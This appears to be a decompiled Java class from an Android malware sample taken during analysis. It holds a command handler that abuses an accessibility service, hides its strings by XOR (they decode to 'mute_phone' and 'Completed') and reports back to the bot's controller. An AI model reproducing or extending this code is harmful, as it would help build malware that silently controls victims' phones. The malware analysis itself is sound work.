package com.zjxyxnvvp.nxvxchltf.i;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import com.zjxyxnvvp.nxvxchltf.d;
import com.zjxyxnvvp.nxvxchltf.util.b;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class i {
    private static short[] $ = {3874, 3898, 3899, 3882, 3856, 3903, 3879, 3872, 3873, 3882, 7548, 7531, 7549, 7547, 7522, 7546, 2043, 2007, 2005, 1992, 2004, 2013, 1996, 2013, 2012};

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static void a(AccessibilityService accessibilityService, AccessibilityEvent accessibilityEvent) {
        d dVar = d.e;
        p pVar = dVar.c;
        String $2 = $(0, 10, 3919);
        if (pVar.b($2) != null) {
            b.v(accessibilityService);
            JSONObject jSONObject = new JSONObject();
            try {
                jSONObject.put($(10, 16, 7438), $(16, 25, 1976));
            } catch (JSONException e) {
                e.printStackTrace();
            }
            dVar.c.e($2, jSONObject);
        }
    }
}
